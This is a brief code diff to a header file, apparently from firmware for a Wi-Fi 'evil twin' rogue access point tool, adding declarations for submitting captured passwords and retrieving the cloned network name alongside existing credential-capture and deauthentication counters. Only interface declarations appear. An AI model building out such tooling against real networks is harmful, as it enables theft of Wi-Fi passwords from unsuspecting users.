@@ -24,5 +24,7 @@ uint8_t evil_twin_getCredCount();
 CapturedCred* evil_twin_getCreds();
 uint32_t evil_twin_getDeauthCount();
 String evil_twin_getIP();
+void evil_twin_submitCred(const char* password);
+const char* evil_twin_getCloneSSID();
 
 #endif // EVIL_TWIN_H
